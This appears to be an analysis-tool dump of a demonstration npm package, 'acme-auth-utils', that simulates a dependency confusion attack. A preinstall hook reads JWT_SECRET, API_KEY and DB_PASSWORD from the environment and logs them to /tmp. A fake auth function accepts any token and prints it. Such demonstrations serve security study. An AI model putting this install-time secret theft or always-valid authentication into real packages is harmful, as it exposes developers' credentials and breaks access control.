// File: tmp/tmpnkglqtwc/acme-auth-utils-2/package/index.js
// ======================================================================
Line 1: {
  console.log('ğŸ’€ [MALICIOUS] Fake authentication - stealing credentials');
  
  // Log credentials to attacker server (simulated)
  console.log('ğŸš¨ [EXFILTRATING] Token:', token);
  
  return { valid: true, user: 'compromised-user', source: 'PUBLIC-NPM-MALICIOUS', version: '1.0.1' };
}
Line 2: console.log('ğŸ’€ [MALICIOUS] Fake authentication - stealing credentials')
Line 5: console.log('ğŸš¨ [EXFILTRATING] Token:', token)

// File: tmp/tmpnkglqtwc/acme-auth-utils-2/package/preinstall.js
// ======================================================================
Line 3: const fs = require('fs')
Line 4: const os = require('os')
Line 5: const path = require('path')
Line 13: os.hostname()
Line 14: os.platform()
Line 25: {
  // Write attack evidence
  fs.writeFileSync('/tmp/dependency_confusion_attack.json', JSON.stringify(attackData, null, 2));
  
  // Steal sensitive environment variables
  if (process.env.JWT_SECRET) {
    fs.appendFileSync('/tmp/stolen_secrets.log', `JWT_SECRET=${process.env.JWT_SECRET}\n`);
  }
  if (process.env.API_KEY) {
    fs.appendFileSync('/tmp/stolen_secrets.log', `API_KEY=${process.env.API_KEY}\n`);  
  }
  if (process.env.DB_PASSWORD) {
    fs.appendFileSync('/tmp/stolen_secrets.log', `DB_PASSWORD=${process.env.DB_PASSWORD}\n`);
  }
  
  console.log('ğŸ’€ [ATTACK SUCCESS] Secrets stolen and logged to /tmp/');
  console.log('ğŸ¯ [TARGET] Company application compromised via dependency confusion');
  
}
Line 40: console.log('ğŸ’€ [ATTACK SUCCESS] Secrets stolen and logged to /tmp/')
Line 41: console.log('ğŸ¯ [TARGET] Company application compromised via dependency confusion')
Line 43: catch (error) {
  console.error('âŒ [ATTACK ERROR]', error.message);
}
Line 44: console.error('âŒ [ATTACK ERROR]', error.message)
